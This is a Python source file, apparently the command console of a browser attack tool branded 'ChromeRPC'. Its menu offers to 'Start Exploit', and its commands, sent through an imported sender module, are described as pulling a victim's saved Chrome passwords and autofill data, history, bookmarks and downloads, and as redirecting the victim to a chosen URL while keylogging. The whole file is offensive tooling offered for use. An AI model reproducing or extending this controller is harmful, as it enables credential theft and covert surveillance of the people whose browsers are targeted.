import sender
import os
import sys

def header():
	print('''
==================================================
 .--. .-.                             .---.  .--. 
: .--': :                             : .; :: .--'
: :   : `-. .--.  .--. ,-.,-.,-. .--. :  _.': `;  
: :__ : .. :: ..'' .; :: ,. ,. :' '_.': :   : :__ 
`.__.':_;:_;:_;  `.__.':_;:_;:_;`.__.':_;   `.__.'
	  https://github.com/flancast90
	  	   By: BLUND3R
==================================================  
                      
           Type "--help" for options.  
           
	''')

def cls():
	os.system('cls' if os.name == 'nt' else 'clear')

def get_cmd():	
	cmd_list = ['--help', '--get-pwds', '--get-hist', '--get-bkmrks', '--get-dwnlds']
	
	cmd = input('\n>>>')
	cmd = cmd.strip()
	
	if cmd not in cmd_list and "--redir " not in cmd:
		if cmd == "exit":
			sys.exit(0)
		
		print("Invalid command. Type '--help' for options.")
		get_cmd()
		
	elif cmd in cmd_list:
		if cmd == "--help":
			help()
		else:
			sender.comm(cmd)
			get_cmd()
		
	if "--redir " in cmd:
		try:
			if ("True" in cmd or "False" in cmd) and ("http://" in cmd or "https://" in cmd):
				print("Redirecting user... Data will be sent upon user tab closure.")
			
				sender.comm(cmd)
				get_cmd()
			else:
				print("Arguments invalid. Please try again")
				get_cmd()
		except Exception as e:
			print(str(e))
			print("\nAn error occurred.")
			get_cmd()
		

def help():
	cls()
	header()
	
	print('''
HELP: Commands
	
[--help] - Get help.
[exit] - Exit the program.
[--get-pwds] - Returns victim's stored Chrome autofill data.
[--get-hist] - Returns victim's Chrome browser history.
[--get-bkmrks] - Returns victim's Chrome saved sites.
[--get-dwnlds] - Returns victim's Chrome downloads and links.
[--redir URL True/False] - Redirect victim to given url. Keylog user as True/False
	
		Press any key to continue ... 
	''')
	input('')
	
	cls()
	header()
	get_cmd()


def __main__():
	cls()
	header()
	
	# print options to user for program starting
	def opt_menu():
		cls()
		header()
		
		try:
			print('''
1. Start Exploit
2. Exploit Options
99. Exit
			''')
			inp = int(input(">>> "))
			
			if inp == 1:
				cls()
				header()
				
				get_cmd()
			elif inp == 2:
				help()
			elif inp == 99:
				sys.exit(0)
			else:
				print("Please enter a valid option!")
		except Exception as e:
			print("Please enter a valid option!")
			print(e)
			
			if e == "SystemExit":
				sys.exit(0)
			
			#opt_menu()
	
	opt_menu()
	
	
if __name__ == "__main__":
	__main__()